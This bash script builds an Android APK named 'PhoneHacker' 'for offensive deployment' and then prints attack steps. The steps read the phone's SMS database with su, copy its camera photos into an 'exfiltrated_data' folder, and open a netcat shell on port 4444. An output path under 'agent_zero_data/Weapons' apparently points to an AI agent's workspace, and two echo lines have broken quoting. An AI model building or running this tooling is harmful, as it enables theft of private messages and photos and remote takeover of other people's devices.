#!/bin/bash

# Immediate APK Build Script for Android Offensive Security
# Automated build process with dependency installation

# Current datetime
echo "=== IMMEDIATE APK BUILDING - FULL AUTOMATION ==="
echo "[+] Current datetime: $(date)"
echo "[+] Project location: $(pwd)"
echo "[+] Starting automated APK build process..."

# Check for Java installation
if ! command -v java &> /dev/null; then
    echo "[!] Java not found. Installing OpenJDK 11..."
    sudo apt-get update && sudo apt-get install -y openjdk-11-jdk
fi

echo "[+] Java version: $(java -version 2>&1 | head -n 1)"

# Set Android SDK environment variables
if [ -z "$ANDROID_SDK_ROOT" ]; then
    echo "[!] ANDROID_SDK_ROOT is not set. Attempting to locate Android SDK..."
    if [ -d "$HOME/Android/Sdk" ]; then
        export ANDROID_SDK_ROOT="$HOME/Android/Sdk"
    elif [ -d "/opt/android-sdk" ]; then
        export ANDROID_SDK_ROOT="/opt/android-sdk"
    else
        echo "[!] Android SDK not found. Install Android Studio or set ANDROID_SDK_ROOT."
        exit 1
    fi
fi

export PATH=$PATH:$ANDROID_SDK_ROOT/tools
export PATH=$PATH:$ANDROID_SDK_ROOT/platform-tools

echo "[+] Android SDK location: $ANDROID_SDK_ROOT"

# Verify Gradle wrapper
if [ ! -f "gradlew" ]; then
    echo "[!] gradlew not found. Recreating Gradle wrapper..."
    mkdir -p gradle/wrapper/
    wget https://github.com/gradle/gradle/raw/v7.4.0/gradle/wrapper/gradle-wrapper.jar -O gradle/wrapper/gradle-wrapper.jar || {
        echo "[!] Failed to download Gradle wrapper. Check internet connection.";
        exit 1
    }
    cat > gradlew << 'EOL'
#!/bin/sh
APP_HOME="$(dirname "$0")"
GRADLE_WRAPPER_JAR="$APP_HOME/gradle/wrapper/gradle-wrapper.jar"
exec java -jar "$GRADLE_WRAPPER_JAR" "$@"
EOL
    chmod +x gradlew
fi

# Build APK
echo "[+] Building APK for offensive deployment..."
./gradlew assembleDebug || {
    echo "[!] Gradle build failed. Attempting clean build..."
    ./gradlew clean assembleDebug || {
        echo "[!] APK build failed. Check for errors above.";
        exit 1
    }
}

# Verify APK creation
APK_PATH="app/build/outputs/apk/debug/PhoneHacker-debug.apk"
if [ -f "$APK_PATH" ]; then
    echo "[+] APK BUILD SUCCESSFUL"
    echo "[+] APK location: $(pwd)/$APK_PATH"
    echo "[+] APK size: $(du -h $APK_PATH | cut -f1)"
    echo "[+] APK MD5: $(md5sum $APK_PATH | cut -d' ' -f1)"
    echo "[+] Build completed at: $(date)"
    echo ""
    echo "=== IMMEDIATE DEPLOYMENT INSTRUCTIONS ==="
    echo "1. Install the APK on your Android device:"
    echo "   adb install $APK_PATH"
    echo "2. USB OTG Exploitation:"
    echo "   adb shell input text "su -c 'cat /data/data/com.android.providers.telephony/databases/mmssms.db'""
    echo "3. Data Exfiltration:"
    echo "   adb pull /sdcard/DCIM/Camera/ ~/exfiltrated_data/"
    echo "4. Reverse Shell:"
    echo "   adb shell "nc -lvp 4444 -e /system/bin/sh""
    echo ""
    echo "HOST_MACHINE_PATH: ~/agent_zero_data/Weapons/mobile_attacks/android_to_android/$APK_PATH"
else
    echo "[!] APK BUILD FAILED"
    echo "[!] Check the build output above for errors"
    exit 1
fi
